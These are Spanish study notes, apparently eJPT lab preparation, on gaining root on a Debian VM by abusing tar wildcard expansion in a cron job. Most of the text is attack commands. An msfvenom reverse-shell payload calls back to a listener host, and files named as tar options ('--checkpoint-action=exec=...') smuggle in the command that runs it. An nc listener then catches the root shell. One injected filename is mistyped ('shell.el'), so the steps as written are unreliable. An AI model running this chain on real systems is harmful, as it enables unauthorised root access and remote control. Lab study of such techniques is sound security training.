- Vea el contenido del otro script de trabajo cron:

```
cat /usr/local/bin/compress.sh
```
Tenga en cuenta que el comando tar se ejecuta con un comodín (*) en su directorio de inicio.

- Eche un vistazo a la página GTFOBins para encontrar tar. Tenga en cuenta que tar tiene opciones de línea de comando que le permiten ejecutar otros comandos como parte de una función de punto de control.

- Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

- Transfiera el archivo shell.elf a /home/user/ en la máquina virtual Debian (puede usar scp o alojar el archivo en un servidor web en su Kali Box y usar wget). Asegúrese de que el archivo sea ejecutable:

```
chmod +x /home/user/shell.elf
```
- Cree estos dos archivos en /home/user:

```
touch /home/user/--checkpoint=1  
touch /home/user/--checkpoint-action=exec=shell.el 
```

- Cuando se ejecuta el comando tar en el trabajo cron, el comodín (*) se expandirá para incluir estos archivos. Dado que sus nombres de archivos son opciones de línea de comando tar válidas, tar los reconocerá como tales y los tratará como opciones de línea de comando en lugar de nombres de archivo.

- Configure un detector de netcat en su caja Kali en el puerto 4444 y espere a que se ejecute el trabajo cron (no debería tardar más de un minuto). Un shell raíz debería conectarse nuevamente a su oyente netcat.

```
nc -nvlp 4444
```

- Recuerde salir del shell raíz y eliminar todos los archivos que creó para evitar que el trabajo cron se ejecute nuevamente:

```
rm /home/user/shell.elf  
rm /home/user/--checkpoint=1  
rm /home/user/--checkpoint-action=exec=shell.elf
```

enlace:
[[Preparacion-Ejpt]]
[[Cron Jobs - PATH Environment Variable]]
[[Cron Jobs - File Permissions]]